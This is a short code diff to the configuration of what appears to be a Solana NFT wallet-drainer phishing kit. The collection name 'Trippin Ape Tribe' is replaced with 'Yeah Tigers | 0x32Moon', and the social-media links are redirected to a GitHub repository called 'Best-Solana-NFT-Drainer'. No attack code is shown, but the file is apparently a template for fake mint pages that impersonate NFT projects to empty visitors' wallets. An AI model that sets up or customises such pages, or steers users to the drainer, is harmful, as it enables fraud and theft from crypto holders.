@@ -1,10 +1,10 @@
 const collectionInfo = {
-    name: "Trippin Ape Tribe",
+    name: "Yeah Tigers | 0x32Moon",
     title: "{name}", 
-    date: "20.06.2022",
+    date: "30.06.2022",
     socialMedia: {
-        discord: "https://discord.gg/trippinapetribe",
-        twitter: "https://twitter.com/TrippinApeNFT",
+        discord: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/",
+        twitter: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/",
     },
     medias: {
         preview: "gif.gif",
